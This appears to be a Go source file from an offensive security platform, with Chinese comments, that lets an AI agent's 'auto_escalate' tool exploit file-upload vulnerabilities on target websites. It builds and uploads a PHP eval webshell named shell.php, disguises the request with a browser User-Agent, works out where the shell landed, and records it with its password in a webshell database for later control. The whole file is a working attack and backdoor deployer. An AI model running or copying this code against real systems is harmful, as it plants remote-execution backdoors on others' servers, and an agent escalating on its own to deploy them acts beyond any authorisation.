package server

// escalate_deploy.go — 渗透自动联动部署回调：
//   Agent 调 auto_escalate → SetEscalateHooks 回调到此处执行实际部署。

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/url"
	"strings"
)

// escalateDeploy 执行实际 payload 部署（由 Agent 的 auto_escalate 工具触发）。
func (s *Server) escalateDeploy(ctx context.Context, vulnType, targetURL string, params map[string]any) (string, error) {
	switch vulnType {
	case "upload":
		return s.escalateDeployUpload(ctx, targetURL, params)
	default:
		return "", fmt.Errorf("不支持的部署类型: %s", vulnType)
	}
}

// escalateDeployUpload 通过文件上传漏洞部署 webshell。
func (s *Server) escalateDeployUpload(ctx context.Context, targetURL string, params map[string]any) (string, error) {
	uploadURL, _ := params["upload_url"].(string)
	field, _ := params["upload_field"].(string)
	if uploadURL == "" {
		uploadURL = targetURL
	}
	if field == "" {
		field = "file"
	}

	// 生成 webshell 内容（由 Agent 传入，或在此生成）
	shellContent, _ := params["shell_content"].(string)
	if shellContent == "" {
		shellContent = "<?php @eval(base64_decode(file_get_contents('php://input'))); ?>"
	}

	// 构造 multipart 上传
	var buf bytes.Buffer
	writer := multipart.NewWriter(&buf)
	fw, err := writer.CreateFormFile(field, "shell.php")
	if err != nil {
		return "", fmt.Errorf("构造表单失败: %w", err)
	}
	if _, err := fw.Write([]byte(shellContent)); err != nil {
		return "", err
	}
	// 可能需要的额外字段
	if extra, ok := params["extra_fields"].(map[string]any); ok {
		for k, v := range extra {
			_ = writer.WriteField(k, fmt.Sprint(v))
		}
	}
	writer.Close()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, uploadURL, &buf)
	if err != nil {
		return "", err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")

	client := &http.Client{Timeout: 30e9}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("上传失败: %w", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20))

	if resp.StatusCode >= 400 {
		return "", fmt.Errorf("上传返回 %d: %s", resp.StatusCode, truncateStr(string(body), 200))
	}

	// 推断 webshell URL（常见模式：上传目录 + 文件名）
	shellURL := inferShellURL(uploadURL, resp, string(body))
	if shellURL == "" {
		shellURL = urlOrigin(targetURL) + "/uploads/shell.php"
	}

	// 保存到 webshell 目标管理（密码/编码由 Agent 生成的 shell_params 透传，
	// 兜底 auto/raw/php）。占位符必须是 PG 的 $n —— 此前误用 ? 导致静默失败。
	password, _ := params["shell_password"].(string)
	encoder, _ := params["shell_encoder"].(string)
	scriptType, _ := params["shell_script_type"].(string)
	if password == "" {
		password = "auto"
	}
	if encoder == "" {
		encoder = "raw"
	}
	if scriptType == "" {
		scriptType = "php"
	}
	name := strings.TrimPrefix(strings.TrimPrefix(urlOrigin(targetURL), "https://"), "http://")
	if len(name) > 40 {
		name = name[:40]
	}
	_, _ = s.m.PG().Exec(`INSERT INTO webshell_targets (group_name, name, url, password, encoder, script_type, note)
		VALUES ('auto', $1, $2, $3, $4, $5, 'auto_escalate 自动部署')
		ON CONFLICT DO NOTHING`,
		name, shellURL, password, encoder, scriptType)

	return shellURL, nil
}

// inferShellURL 从上传响应中推断 webshell URL。
func inferShellURL(uploadURL string, resp *http.Response, body string) string {
	// 常见模式 1：响应中包含文件路径（uploads/xxx.php 等）
	for _, pattern := range []string{"uploads/", "upload/", "files/", "static/", "data/"} {
		if idx := strings.Index(body, pattern); idx >= 0 {
			end := strings.IndexAny(body[idx:], "\"'< \n")
			if end > 0 {
				path := body[idx : idx+end]
				return strings.TrimRight(urlOrigin(uploadURL), "/") + "/" + path
			}
		}
	}
	// 常见模式 2：Location header
	if loc := resp.Header.Get("Location"); loc != "" {
		return loc
	}
	return ""
}

// urlOrigin 取 scheme://host[:port]，路径部分截掉——避免把 upload.php 拼进 shell URL。
func urlOrigin(raw string) string {
	if u, err := url.Parse(raw); err == nil && u.Host != "" {
		return u.Scheme + "://" + u.Host
	}
	// 解析失败的兜底：手找第一个 '/' 在 '://' 之后的位置
	if i := strings.Index(raw, "://"); i >= 0 {
		if j := strings.Index(raw[i+3:], "/"); j >= 0 {
			return raw[:i+3+j]
		}
	}
	return strings.TrimRight(raw, "/")
}
